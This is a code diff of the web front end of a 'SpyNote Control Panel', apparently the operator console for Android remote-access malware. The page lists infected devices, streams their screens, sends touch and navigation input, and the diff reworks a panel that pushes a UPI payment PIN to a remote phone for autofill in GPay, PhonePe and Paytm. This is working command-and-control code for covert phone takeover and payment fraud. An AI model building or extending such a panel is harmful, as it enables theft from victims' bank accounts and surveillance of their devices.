@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>📱 SpyNote Control Panel</title>
+    <title>📱 SpyNote Control Panel v2.0</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="/socket.io/socket.io.js"></script>
     <style>
@@ -31,11 +31,10 @@
         }
         #screen { 
             width: 100%; height: 100%; background: #111; border-radius: 20px;
-            image-rendering: pixelated; image-rendering: -webkit-optimize-contrast;
+            image-rendering: pixelated;
         }
         #fps-counter { position: fixed; top: 10px; right: 150px; font-size: 12px; color: #00ff88; }
-        #controls { text-align: center; position: fixed; bottom: 20px; 
-            left: 50%; transform: translateX(-50%); }
+        #controls { text-align: center; position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); }
         button {
             padding: 12px 24px; margin: 0 5px; background: linear-gradient(45deg, #007bff, #0056b3); 
             color: white; border: none; border-radius: 20px; cursor: pointer; 
@@ -43,25 +42,38 @@
             box-shadow: 0 5px 15px rgba(0,123,255,0.4);
         }
         button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,123,255,0.6); }
-        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        button.danger { background: linear-gradient(45deg, #ff4444, #cc0000); }
+        button.success { background: linear-gradient(45deg, #00ff88, #00cc66); }
         #status { position: fixed; top: 10px; right: 10px; background: rgba(0,0,0,0.8); 
             padding: 10px; border-radius: 5px; font-size: 12px; }
-
-        /* UPI PIN Panel */
+        
         #upi-panel {
             position: fixed; top: 80px; right: 10px; 
             background: rgba(0,0,0,0.95); padding: 20px; 
             border-radius: 10px; backdrop-filter: blur(15px); min-width: 220px;
-            display: none;
         }
-        #upi-panel.active { display: block; animation: slideIn 0.3s; }
-        @keyframes slideIn { from { opacity: 0; transform: translateX(100%); } to { opacity: 1; transform: translateX(0); } }
-        #pin-input { width: 100%; padding: 12px; margin: 10px 0; background: #333; 
-            border: none; border-radius: 8px; color: white; font-size: 18px; 
-            letter-spacing: 5px; text-align: center; }
-        .pin-status { padding: 8px; margin: 5px 0; border-radius: 5px; text-align: center; font-size: 12px; }
-        .status-on { background: rgba(0,255,0,0.3); color: #00ff88; }
-        .status-off { background: rgba(255,0,0,0.3); color: #ff4444; }
+        #upi-panel h3 { color: #00ff88; margin-bottom: 15px; font-size: 16px; }
+        input[type="text"] { 
+            width: 100%; padding: 12px; margin: 8px 0; 
+            background: #333; color: white; border: 2px solid #555; 
+            border-radius: 8px; font-size: 18px; font-weight: bold;
+            letter-spacing: 4px; text-align: center;
+        }
+        input[type="text"]:focus { border-color: #00ff88; outline: none; }
+        .toggle-switch { display: flex; align-items: center; margin: 10px 0; }
+        .toggle-switch input[type="checkbox"] { width: 0; height: 0; opacity: 0; }
+        .toggle-slider {
+            position: relative; width: 50px; height: 24px; 
+            background: #555; border-radius: 12px; margin: 0 10px;
+            transition: 0.3s; cursor: pointer;
+        }
+        .toggle-slider:before {
+            content: ''; position: absolute; top: 2px; left: 2px;
+            width: 20px; height: 20px; background: #ccc;
+            border-radius: 50%; transition: 0.3s;
+        }
+        input[type="checkbox"]:checked + .toggle-slider { background: #00ff88; }
+        input[type="checkbox"]:checked + .toggle-slider:before { transform: translateX(26px); }
     </style>
 </head>
 <body>
@@ -70,20 +82,23 @@
         <div id="device-list">Loading...</div>
     </div>
     
+    <div id="upi-panel">
+        <h3>🔐 UPI Autofill</h3>
+        <input type="text" id="upiPin" placeholder="1234" maxlength="6" autocomplete="one-time-code">
+        <div class="toggle-switch">
+            <label>Autofill:</label>
+            <input type="checkbox" id="autofillToggle">
+            <label class="toggle-slider"></label>
+        </div>
+        <button class="success" onclick="sendUpiPin()">✅ Apply PIN</button>
+        <small style="color: #00ff88;">Works: GPay/PhonePe/Paytm</small>
+    </div>
+    
     <div id="status">
         <div>Status: <span id="connectionStatus">Connecting...</span></div>
         <div>FPS: <span id="fps">0</span> | Device: <span id="selectedDevice">-</span></div>
     </div>
     <div id="fps-counter">FPS: 0</div>
-
-    <!-- UPI PIN Autofill Panel -->
-    <div id="upi-panel">
-        <h4>🔐 UPI PIN Autofill</h4>
-        <div class="pin-status status-off" id="pin-status">OFF</div>
-        <input type="password" id="pin-input" placeholder="0000" maxlength="6">
-        <button onclick="togglePinAutofill()">Toggle Autofill</button>
-        <button onclick="sendPin()">📤 Send PIN</button>
-    </div>
 
     <div id="phone-frame">
         <canvas id="screen"></canvas>
@@ -91,7 +106,6 @@
 
     <div id="controls">
         <button onclick="sendBack()">🔙 Back</button>
-        <button onclick="sendHome()">🏠 Home</button>
         <button onclick="toggleFullScreen()">📱 Fullscreen</button>
     </div>
 
@@ -100,7 +114,7 @@
         let currentDevice = null;
         let deviceWidth = 1080, deviceHeight = 1920;
         let lastFrameTime = 0, frameCount = 0;
-        let pinAutofillEnabled = false;
+        let autofillEnabled = false;
 
         const canvas = document.getElementById('screen');
         const ctx = canvas.getContext('2d');
@@ -110,10 +124,10 @@
         const selectedDevice = document.getElementById('selectedDevice');
         const fpsCounter = document.getElementById('fps-counter');
         const fpsDisplay = document.getElementById('fps');
-        const upiPanel = document.getElementById('upi-panel');
-        const pinStatus = document.getElementById('pin-status');
-        const pinInput = document.getElementById('pin-input');
+        const upiPinInput = document.getElementById('upiPin');
+        const autofillToggle = document.getElementById('autofillToggle');
 
+        // Socket events
         socket.on('connect', () => {
             connectionStatus.textContent = '✅ Connected';
             connectionStatus.style.color = '#00ff88';
@@ -123,23 +137,22 @@
             updateDeviceList(devices);
         });
 
-        socket.on('pin-status', (status) => {
-            pinAutofillEnabled = status.enabled;
-            updatePinUI();
-        });
-
         socket.on('screen-update', (data) => {
             if (data.deviceId !== currentDevice) return;
+            
             try {
                 deviceWidth = data.width;
                 deviceHeight = data.height;
+                
                 const img = new Image();
                 img.onload = () => {
                     const rect = phoneFrame.getBoundingClientRect();
                     canvas.width = rect.width;
                     canvas.height = rect.height;
+                    
                     ctx.imageSmoothingEnabled = false;
                     ctx.drawImage(img, 0, 0, rect.width, rect.height);
+                    
                     frameCount++;
                     const now = performance.now();
                     if (now - lastFrameTime >= 1000) {
@@ -150,6 +163,7 @@
                         lastFrameTime = now;
                     }
                 };
+                
                 img.src = 'data:image/jpeg;base64,' + data.data;
             } catch (e) {
                 console.error('Screen update error:', e);
@@ -176,45 +190,9 @@
             document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
             el.classList.add('active');
             socket.emit('control', { deviceId });
-            upiPanel.classList.add('active');
-            socket.emit('pin-status-request', { deviceId });
         }
 
-        function updatePinUI() {
-            if (pinAutofillEnabled) {
-                pinStatus.textContent = 'ON - Auto UPI PIN';
-                pinStatus.className = 'pin-status status-on';
-            } else {
-                pinStatus.textContent = 'OFF';
-                pinStatus.className = 'pin-status status-off';
-            }
-        }
-
-        function togglePinAutofill() {
-            if (!currentDevice) return;
-            pinAutofillEnabled = !pinAutofillEnabled;
-            socket.emit('control', { 
-                deviceId: currentDevice, 
-                action: 'toggle-pin-autofill',
-                enabled: pinAutofillEnabled 
-            });
-            updatePinUI();
-        }
-
-        function sendPin() {
-            if (!currentDevice || !pinInput.value) return;
-            socket.emit('control', { 
-                deviceId: currentDevice, 
-                action: 'set-pin',
-                pin: pinInput.value 
-            });
-            pinInput.value = '';
-        }
-
-        pinInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') sendPin();
-        });
-
+        // Touch/Mouse Controls
         let startX = 0, startY = 0, dragging = false;
 
         function getScaledCoords(clientX, clientY) {
@@ -274,10 +252,38 @@
             socket.emit('control', { deviceId: currentDevice, action: 'back' });
         }
 
-        function sendHome() {
+        // 🔥 NEW UPI AUTOFILL
+        function sendUpiPin() {
             if (!currentDevice) return;
-            socket.emit('control', { deviceId: currentDevice, action: 'home' });
+            const pin = upiPinInput.value.trim();
+            if (pin.length < 4) {
+                alert('Enter 4-6 digit UPI PIN');
+                return;
+            }
+            
+            socket.emit('upi-pin', { 
+                deviceId: currentDevice, 
+                pin: pin, 
+                enabled: autofillEnabled 
+            });
+            
+            console.log('✅ UPI PIN sent:', pin);
         }
+
+        autofillToggle.addEventListener('change', () => {
+            autofillEnabled = autofillToggle.checked;
+            if (currentDevice) {
+                socket.emit('autofill-toggle', { 
+                    deviceId: currentDevice, 
+                    enabled: autofillEnabled 
+                });
+            }
+            upiPinInput.focus();
+        });
+
+        upiPinInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') sendUpiPin();
+        });
 
         function toggleFullScreen() {
             if (!document.fullscreenElement) {
